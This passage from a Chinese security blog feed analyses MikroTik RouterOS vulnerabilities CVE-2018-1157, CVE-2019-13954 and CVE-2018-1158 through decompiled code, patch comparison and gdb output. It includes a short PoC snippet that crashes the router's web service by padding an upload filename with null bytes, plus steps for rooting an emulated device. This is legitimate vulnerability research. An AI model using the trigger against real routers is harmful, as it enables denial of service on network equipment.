main()</span><br><span class="line">&#123;</span><br><span class="line">  hello_world(&quot;Hello World!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在汇编中调用C中的函数"><a href="#在汇编中调用C中的函数" class="headerlink" title="在汇编中调用C中的函数"></a>在汇编中调用C中的函数</h3><p>以<code>printf</code>为例，通过在汇编代码中调用<code>printf()</code>函数，示例代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.extern printf</span><br><span class="line">.globl main</span><br><span class="line">.section .data</span><br><span class="line">message: .ascii &quot;hello,world!\n&quot;</span><br><span class="line">format: .ascii &quot;%s&quot;</span><br><span class="line">.section .text</span><br><span class="line">main:</span><br><span class="line">    push $message</span><br><span class="line">    push $format</span><br><span class="line">    mov $0, %eax</span><br><span class="line">    call printf</span><br><span class="line">    add $0x8, %esp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>使用gcc编译如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello_world.s -o hello_world</span><br></pre></td></tr></table></figure><blockquote><ol><li>使用gcc编译汇编代码时，开始符号不再是_start而是main。由于main是一个函数，所以在最后必须要有<code>ret</code>指令；</li><li>在调用函数之前，寄存器<code>eax</code>/<code>rax</code>的值必须设为0。</li></ol></blockquote><h3 id="在C中嵌入汇编"><a href="#在C中嵌入汇编" class="headerlink" title="在C中嵌入汇编"></a>在C中嵌入汇编</h3><p>最直接的方式是在C程序中嵌入汇编代码，以Linux x86_64为例，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;addl %edi, %esi&quot;</span>);</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;movl %esi, %eax&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例代码中，也可以将多条汇编指令写在一起，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asm(</span><br><span class="line">    &quot;addl %edi, %esi\n\r&quot;</span><br><span class="line">    &quot;movl %esi, %eax\n\r&quot;</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>由于gcc编译器在进行解析时是先将汇编指令打印到一个文件中，所以需要带上格式化控制串。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>对Linux平台下的系统调用及函数调用时的传参约定进行了介绍，同时简单介绍了C与汇编语言混合使用的三种情形。</p><blockquote><p>如果想要进行更深入的理解，可自行查阅网上的相关资料。</p></blockquote><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9hYm5lcnJqby5naXRodWIuaW8vYmxvZy8yMDE2LzAyLzI3L21peGluZy1hc3NlbWJseS1hbmQtYy8=">Mixing Assembly and C<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGV2ZHVuZ2Vvbi5jb20vY29udGVudC9ob3ctbWl4LWMtYW5kLWFzc2VtYmx5">How to Mix C and Assembly<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9jcy5sbXUuZWR1L35yYXkvbm90ZXMvc3lzY2FsbHMv">Linux System Calls<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpYm9va3Mub3JnL3dpa2kvWDg2X0Fzc2VtYmx5L0ludGVyZmFjaW5nX3dpdGhfTGludXg=">X86 Assembly/Interfacing with Linux<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MikroTik RouterOS漏洞CVE-2019-13954分析</title>
      <link href="2019/08/23/MikroTik-RouterOS%E6%BC%8F%E6%B4%9ECVE-2019-13954%E5%88%86%E6%9E%90/"/>
      <url>2019/08/23/MikroTik-RouterOS%E6%BC%8F%E6%B4%9ECVE-2019-13954%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><code>CVE-2019-13954</code>是<code>MikroTik RouterOS</code>中存在的一个<code>memory exhaustion</code>漏洞。认证的用户通过构造并发送一个特殊的<code>POST</code>请求，服务程序在处理<code>POST</code>请求时会陷入”死”循环，造成<code>memory exhaustion</code>，导致对应的服务程序崩溃或者系统重启。</p><p>该漏洞与<code>CVE-2018-1157</code>类似，是由于对漏洞<code>CVE-2018-1157</code>的修复不完善造成。下面通过搭建<code>MikroTik RouterOS</code>仿真环境，结合漏洞<code>CVE-2018-1157</code>的<code>PoC</code>脚本及补丁，对漏洞<code>CVE-2019-13954</code>进行分析。</p><a id="more"></a><h3 id="CVE-2018-1157漏洞分析"><a href="#CVE-2018-1157漏洞分析" class="headerlink" title="CVE-2018-1157漏洞分析"></a><code>CVE-2018-1157</code>漏洞分析</h3><p><code>MikroTik RouterOS</code>环境的搭建、<code>root shell</code>的获取及相关资料可参考文章《<a href="https://cq674350529.github.io/2019/08/15/CVE-2018-1158-MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%91%E7%8E%B0CVE-2019-13955/">CVE-2018-1158 MikroTik RouterOS漏洞分析之发现CVE-2019-13955</a>》，这里不再赘述。</p><p>根据<code>Tenable</code>的<span class="exturl" data-url="aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vc2VjdXJpdHkvcmVzZWFyY2gvdHJhLTIwMTgtMjE=">漏洞公告<i class="fa fa-external-link-alt"></i></span>可知，漏洞<code>CVE-2018-1157</code>在<code>6.40.9</code>、<code>6.42.7</code>及<code>6.43</code>等版本中修复。为了便于对漏洞<code>CVE-2018-1157</code>进行分析，选取的相关镜像版本如下。</p><ul><li><code>6.40.5</code>，<code>x86</code>架构，用于进行漏洞分析</li><li><code>6.42.11</code>，<code>x86</code>架构，用于进行补丁分析</li></ul><blockquote><p>为了便于分析，临时关闭了系统的<code>ASLR</code>机制。</p></blockquote><p>与该漏洞相关的程序为<code>www</code>，在设备上利用<code>gdbserver</code>附加到该进程进行远程调试，然后运行对应的<code>PoC</code>脚本，发现系统直接重启，在本地<code>gdb</code>中捕获不到任何异常信息。根据漏洞公告中提到的<code>&quot;/jsproxy/upload&quot;</code>，在函数<code>JSProxyServlet::doUpload()</code>内设置断点，进行单步跟踪调试，发现会一直执行如下的代码片段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">JSProxyServlet::doUpload</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, Headers *a3, Headers *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_77464E9F(v27, (<span class="keyword">char</span> *)s1);   <span class="comment">// 读取POST请求数据</span></span><br><span class="line">        <span class="keyword">if</span> ( !LOBYTE(s1[<span class="number">0</span>]) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v36, (<span class="keyword">const</span> <span class="keyword">char</span> *)s1);</span><br><span class="line">        v11 = Headers::parseHeaderLine((Headers *)&amp;v37, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v36);</span><br><span class="line">        <span class="built_in">string</span>::freeptr((<span class="built_in">string</span> *)&amp;v36);</span><br><span class="line">        <span class="keyword">if</span> ( !v11 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v36, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            Response::sendError(a4, <span class="number">400</span>, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v36);</span><br><span class="line">            <span class="built_in">string</span>::freeptr((<span class="built_in">string</span> *)&amp;v36);</span><br><span class="line">        LABEL_56:</span><br><span class="line">            tree_base::clear(v13, v12, &amp;v37, map_node_destr&lt;<span class="built_in">string</span>,HeaderField&gt;);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，函数<code>sub_77464E9F()</code>用于读取<code>POST</code>请求数据并将其保存在<code>s1</code>指向的内存地址空间，其伪代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__usercall sub_77464E9F@&lt;eax&gt;(istream *a1@&lt;eax&gt;, <span class="keyword">char</span> *a2@&lt;edx&gt;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    v2 = a2;</span><br><span class="line">    istream::getline(a1, a2, <span class="number">0x100</span>u, <span class="number">10</span>);    <span class="comment">//第一个参数为this指针，读取的最大长度为0x100</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(v2) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        result = &amp;v2[v4 - <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> ( *result == <span class="number">13</span> )</span><br><span class="line">            *result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当满足以下任一条件时会跳出<code>while</code>循环。</p><ul><li>调用<code>sub_77464E9F()</code>，未读取到数据</li><li>调用<code>Headers::parseHeaderLine()</code>，解析失败</li></ul><p>查看对应的<code>PoC</code>脚本，其对应的部分POST请求数据为<code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&lt;filename&gt;&quot;\r\n</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> filename;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    filename.push_back(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (jsSession.uploadFile(filename, <span class="string">&quot;lol.&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;success!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>filename</code>参数的值过长时，调用<code>istream::getline()</code>读取的内容一直为<code>Content-Disposition：form-data; name=&quot;file&quot;; filename=&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...&quot;</code>(长度超过<code>0x100</code>)。由于上面的2个条件都不满足，造成<code>while</code>循环无法退出，一直执行最终导致<code>&quot;memory exhaustion&quot;</code>。</p><h3 id="CVE-2018-1157补丁分析"><a href="#CVE-2018-1157补丁分析" class="headerlink" title="CVE-2018-1157补丁分析"></a><code>CVE-2018-1157</code>补丁分析</h3><p>版本<code>6.42.11</code>中对<code>CVE-2018-1157</code>进行了修复，根据前面的分析，定位到<code>JSProxyServlet::doUpload()</code>中对应的代码片段，如下。可以看到，在补丁中增加了对读取的POST请求数据长度的判断：当长度超过<code>0x100</code>(包括最后的<code>&#39;\x00&#39;</code>)时，会跳出while循环。</p><blockquote><p>由于两次<code>jsproxy.p</code>的加载基址不一样，所以部分函数的名称可能不一致。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">JSProxyServlet::doUpload</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, Headers *a3, Headers *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_774C31F7(v14, s1);    <span class="comment">// 读取POST请求数据</span></span><br><span class="line">        <span class="keyword">if</span> ( !LOBYTE(s1[<span class="number">0</span>]) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v15 = <span class="number">-1</span>;</span><br><span class="line">        v16 = (<span class="keyword">char</span> *)s1;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v15 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            v17 = *v16++ == <span class="number">0</span>;</span><br><span class="line">            --v15;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( !v17 );    <span class="comment">// 计算读取的数据内容的长度</span></span><br><span class="line">        <span class="keyword">if</span> ( v15 != <span class="number">0xFFFFFEFF</span> ) <span class="comment">// 对应长度为0x100</span></span><br><span class="line">        &#123;</span><br><span class="line">            v37 = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v46, (<span class="keyword">const</span> <span class="keyword">char</span> *)s1);</span><br><span class="line">            v18 = Headers::parseHeaderLine((Headers *)&amp;v47, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v46);</span><br><span class="line">            <span class="built_in">string</span>::freeptr((<span class="built_in">string</span> *)&amp;v46);</span><br><span class="line">            <span class="keyword">if</span> ( v18 )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v46, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        Response::sendError(a4, <span class="number">400</span>, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v46);</span><br><span class="line">        <span class="built_in">string</span>::freeptr((<span class="built_in">string</span> *)&amp;v46);</span><br><span class="line">    LABEL_60:</span><br><span class="line">        tree_base::clear(v20, v19, &amp;v47, map_node_destr&lt;<span class="built_in">string</span>,HeaderField&gt;);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CVE-2019-13954发现"><a href="#CVE-2019-13954发现" class="headerlink" title="CVE-2019-13954发现"></a><code>CVE-2019-13954</code>发现</h3><p>通过对漏洞<code>CVE-2018-1157</code>分析可知，调用<code>istream::getline(a1, a2, 0x100u, &#39;\n&#39;)</code>读取数据时，如果请求数据过长(在遇到分隔符<code>&#39;\n&#39;</code>前<code>0x100</code>个字符已被写入<code>a2</code>中)，那么每次<code>a2</code>中的数据内容都是一样的。而在对应的补丁中，增加了对读取数据长度的判断。</p><p>注意到，在调用<code>istream::getline(a1, a2, 0x100u, &#39;\n&#39;)</code>读取数据时，分隔符为<code>&#39;\n&#39;</code>。也就是说，即使<code>filename</code>参数的值中包含<code>&#39;\x00&#39;</code>，读取时也不会造成截断，但是会影响后面的长度计算。因此，只需要在<code>filename</code>参数后面追加大量的<code>&#39;\x00&#39;</code>，即可绕过补丁，再次触发该漏洞。</p><p>在原有<code>PoC</code>的基础上进行简单修改，在版本为<code>6.42.11</code>的设备上进行验证，发现系统直接重启了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> filename;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">filename.push_back(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)    <span class="comment">// 追加&#x27;\x00&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">filename.push_back(<span class="string">&#x27;\x00&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (jsSession.uploadFile(filename, <span class="string">&quot;lol.&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;success!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码静态分析，该漏洞在<code>&quot;Long-term&quot;</code>版本<code>6.43.16</code>上仍然存在。</p><blockquote><p><code>6.43.16</code>为发现该问题时”Long-term”系列的最新版本。该漏洞(<code>CVE-2019-13954</code>)目前已被修复，建议及时升级到最新版本。</p></blockquote><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>由于对漏洞<code>CVE-2018-1157</code>的修复不完善，通过在<code>filename</code>参数后面追加大量的<code>&#39;\x00&#39;</code>，可绕过对应的补丁，再次触发该漏洞(<code>CVE-2019-13954</code>)。</li></ul><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vc2VjdXJpdHkvcmVzZWFyY2gvdHJhLTIwMTgtMjE=">Mikrotik RouterOS Multiple Authenticated Vulnerabilities<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxOS9KdWwvMjA=">Two vulnerabilities found in MikroTik’s RouterOS<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9taWtyb3Rpay5jb20vZG93bmxvYWQvY2hhbmdlbG9ncy9sb25nLXRlcm0tcmVsZWFzZS10cmVl">Mikrotik RouterOS Changelogs<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvSFhsLVFMbE5pNHk5RUtCWV96cUtVZw==">https://mp.weixin.qq.com/s/HXl-QLlNi4y9EKBY_zqKUg<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mikrotik </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-1158 MikroTik RouterOS漏洞分析之发现CVE-2019-13955</title>
      <link href="2019/08/15/CVE-2018-1158-MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%91%E7%8E%B0CVE-2019-13955/"/>
      <url>2019/08/15/CVE-2018-1158-MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%91%E7%8E%B0CVE-2019-13955/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><code>CVE-2018-1158</code>是<code>MikroTik</code>路由器中存在的一个<code>stack exhaustion</code>漏洞。认证的用户通过构造并发送一个特殊的<code>json</code>消息，处理程序在解析该<code>json</code>消息时会出现递归调用，造成<code>stack exhaustion</code>，导致对应的服务崩溃重启。</p><p>该漏洞由<code>Tenable</code>的<code>Jacob Baines </code>发现，同时提供了对应的<code>PoC</code>脚本。另外，他的关于<code>RouterOS</code>漏洞挖掘的议题<code>《Bug Hunting in RouterOS》</code>非常不错，对<code>MikroTik</code>路由器中使用的一些自定义消息格式进行了细致介绍，同时还提供了很多工具来辅助分析。相关工具、议题以及<code>PoC</code>脚本可在<code>git</code>库<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlbmFibGUvcm91dGVyb3M=">routeros<i class="fa fa-external-link-alt"></i></span>获取，强烈推荐给对<code>MikroTik</code>设备感兴趣的人。</p><a id="more"></a><p>下面利用已有的<code>PoC</code>脚本和搭建的<code>MikroTik RouterOS</code>仿真环境，对该漏洞的形成原因进行分析。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><code>MikroTik</code>官方提供多种格式的镜像，其中可以利用<code>.iso</code>或者<code>.vmdk</code>格式的镜像，结合<code>VMware</code>虚拟机来搭建仿真环境。具体的搭建步骤可参考文章 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL3RlbmFibGUtdGVjaGJsb2cvbWFrZS1pdC1yYWluLXdpdGgtbWlrcm90aWstYzkwNzA1NDU5YmM2">Make It Rain with MikroTik<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXhpLi9maW5kaW5nLWFuZC1leHBsb2l0aW5nLWN2ZS0yMDE4LTc0NDUtZjMxMDNmMTYzY2Mx">Finding and exploiting CVE-2018–7445<i class="fa fa-external-link-alt"></i></span>，这里不再赘述。</p><p>根据<code>Tenable</code>的<span class="exturl" data-url="aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vc2VjdXJpdHkvcmVzZWFyY2gvdHJhLTIwMTgtMjE=">漏洞公告<i class="fa fa-external-link-alt"></i></span>可知，该漏洞在<code>6.40.9</code>、<code>6.42.7</code>及<code>6.43</code>等版本中修复。为了便于对漏洞进行分析和补丁分析，选取的相关镜像版本如下。</p><ul><li><code>6.40.5</code>，<code>x86</code>架构，用于进行漏洞分析</li><li><code>6.42.11</code>，<code>x86</code>架构，用于进行补丁分析</li></ul><p>搭建起仿真环境后，由于<code>RouterOS</code>自带的命令行界面比较受限，只能执行特定的命令，不便于后续进一步的分析和调试，因此还需要想办法获取设备的<code>root shell</code>。同样，<code>Jacob Baines</code>在他的议题<code>《Bug Hunting in RouterOS》</code>中给出了相应的方法，这里采用修改<code>/rw/DEFCONF</code>的方式。对于该文件的修改，可以通过给<code>Ubuntu</code>虚拟机添加一块硬盘并选择对应的<code>vmdk</code>文件，然后进行<code>mount</code>并修改。</p><p>需要说明的是，采用这种方式进行修改后，每次设备启动后<code>/rw/DEFCONF</code>文件会被删除，如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /etc/rc.d/run.d/S12defconf</span></span><br><span class="line">elif [ -f /rw/DEFCONF ]; then</span><br><span class="line">    # ...</span><br><span class="line">    defcf=$(cat /rw/DEFCONF)</span><br><span class="line">    echo &gt; /ram/defconf-params</span><br><span class="line">    if [ -f /nova/bin/flash ]; then</span><br><span class="line">    /nova/bin/flash --fetch-defconf-params /ram/defconf-params</span><br><span class="line">    fi</span><br><span class="line">    (eval $(cat /ram/defconf-params) action=apply /bin/gosh $defcf;</span><br><span class="line">     cp $defcf $confirm; rm /rw/DEFCONF /ram/defconf-params) &amp;# /rw/DEFCONF 被删除</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>这样下次如果需要获取root shell，还需要再重新挂载并修改，比较麻烦。可行的解决方式如下：</p><ol><li>在修改<code>/rw/DEFCONF</code>文件后，创建一个虚拟机快照，下次直接恢复该快照即可；</li><li>在修改<code>/rw/DEFCONF</code>文件后，将其拷贝一份保存到其他路径，获取到设备<code>root shell</code>后再拷贝一份到<code>/rw</code>路径下。</li></ol><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据漏洞公告可知，与该漏洞相关的程序为<code>www</code>。在设备上利用<code>gdbserver</code>附加到该进程进行远程调试，然后运行对应的<code>PoC</code>脚本，在本地的<code>gdb</code>中捕获到如下异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb)</span><br><span class="line">Thread 2 received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[Switching to Thread 267.373]</span><br><span class="line">&#x3D;&gt; 0x777563f5 &lt;pthread_mutex_lock+9&gt;:   call   0x7775a948</span><br><span class="line">   0x777563fa &lt;pthread_mutex_lock+14&gt;:  add    ebx,0x7c06</span><br><span class="line">   0x77756400 &lt;pthread_mutex_lock+20&gt;:  mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x77756403 &lt;pthread_mutex_lock+23&gt;:  mov    edi,DWORD PTR [esi+0xc]</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; stacktrace</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x777563f5 in pthread_mutex_lock () from 